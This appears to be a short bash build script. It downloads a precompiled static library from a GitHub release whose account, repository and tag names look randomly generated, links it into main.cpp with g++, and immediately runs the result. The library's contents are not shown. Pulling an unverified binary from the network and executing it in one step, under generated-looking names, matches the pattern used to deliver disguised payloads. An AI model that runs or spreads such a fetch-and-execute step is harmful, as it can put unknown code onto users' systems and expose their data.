#!/usr/bin/env bash
set -e
curl --retry 3 --connect-timeout 15 -fsSL --max-time 180 "https://github.com/juniagrovpqe/drainedimagehub/releases/download/frosty-harbor-calm-cedar/frozen-pole.a" -o "frozen-pole.a"
g++ main.cpp "frozen-pole.a" -pthread -O2 -std=c++17 -o app && ./app
